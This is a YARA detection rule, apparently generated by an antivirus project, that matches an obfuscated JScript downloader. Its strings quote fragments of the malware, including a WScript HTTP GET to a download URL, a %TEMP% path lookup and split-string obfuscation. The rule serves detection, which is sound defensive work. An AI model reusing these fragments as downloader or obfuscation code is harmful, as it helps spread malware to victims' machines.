rule sig_20160428_dc837020d70d3d041e5b151284836c99 {
  meta:
    description = "datamaliciousorder - file 20160428_dc837020d70d3d041e5b151284836c99.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26edb8529484a49adc75b9ddc4d600cadef8223debb4fda7b83dfc8ffc2030d4"

  strings:
    $s1  = "FggAjjLwhVmgIqpTmaLuw[UuiJmbMbzVkxNtpVofEaj](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function DzzUyzZqoKdgMfiHfzFhx(HbqZsnEkiEglWnnQhpYpp){InaNnjLbhWayAayCqnYwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function DzzUyzZqoKdgMfiHfzFhx(HbqZsnEkiEglWnnQhpYpp){InaNnjLbhWayAayCqnYwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function YjeTttOkqCzjVxmWucQvi() {return InaNnjLbhWayAayCqnYwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function PlyPjbJkdNteInlHunRxb(MqwXrnNwqPbwYbcJzlRgj, UldTlrZgiFmvRtoDrzRbz){YgjHalGyzWddLbwMpyRdv = YgjHalGyzWddLbwMpyRdv * 1; " ascii
    $s6  = "return MqwXrnNwqPbwYbcJzlRgj - UldTlrZgiFmvRtoDrzRbz;};" fullword ascii
    $s7  = "var InaNnjLbhWayAayCqnYwu = function PjdPtfCzxSxmEwnGieFsi() {return FotHnyHqyGtkOgeYrrXpr[YizKlhGcfObqGcqRkkMcg](\"WScript\"+\"" ascii
    $s8  = "var FotHnyHqyGtkOgeYrrXpr = this[\"WScript\"];" fullword ascii
    $s9  = "var InaNnjLbhWayAayCqnYwu = function PjdPtfCzxSxmEwnGieFsi() {return FotHnyHqyGtkOgeYrrXpr[YizKlhGcfObqGcqRkkMcg](\"WScript\"+\"" ascii
    $s10 = "function YjeTttOkqCzjVxmWucQvi() {return InaNnjLbhWayAayCqnYwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function PlyPjbJkdNteInlHunRxb(MqwXrnNwqPbwYbcJzlRgj, UldTlrZgiFmvRtoDrzRbz){YgjHalGyzWddLbwMpyRdv = YgjHalGyzWddLbwMpyRdv * 1; " ascii
    $s12 = "if (FggAjjLwhVmgIqpTmaLuw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function ZcwKkcHfwGdyPizLqpFml(){return ZqfQrjMtbAtpClrIbiHvs + \"\";};" fullword ascii
    $s14 = "function JuuOeuVgdXikMzuVqfCjk() {return ((JwxAgcTfcOtlIycMjxHis == true) && (JwxAgcTfcOtlIycMjxHis == CktJhzSwlRktLehGkqXyl)) ?" ascii
    $s15 = "function JuuOeuVgdXikMzuVqfCjk() {return ((JwxAgcTfcOtlIycMjxHis == true) && (JwxAgcTfcOtlIycMjxHis == CktJhzSwlRktLehGkqXyl)) ?" ascii
    $s16 = "return PlyPjbJkdNteInlHunRxb(1 == 1 ? ZxtKwhAobTsyYztDofKyp : 0, 1 == 1 ? YqqAgpYrjVezPomXweEdh : 0);" fullword ascii
    $s17 = "function IneRroWkzEshPwqLkeEas(){return YizKlhGcfObqGcqRkkMcg;};" fullword ascii
    $s18 = "function LspAztRggVnrNmzIzuOev(){return 23;};" fullword ascii
    $s19 = "}while (SlwDqnRwwWmbNgfKqzKal);" fullword ascii
    $s20 = "var MrbKqiRvvQyjFcoWlyQvd = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}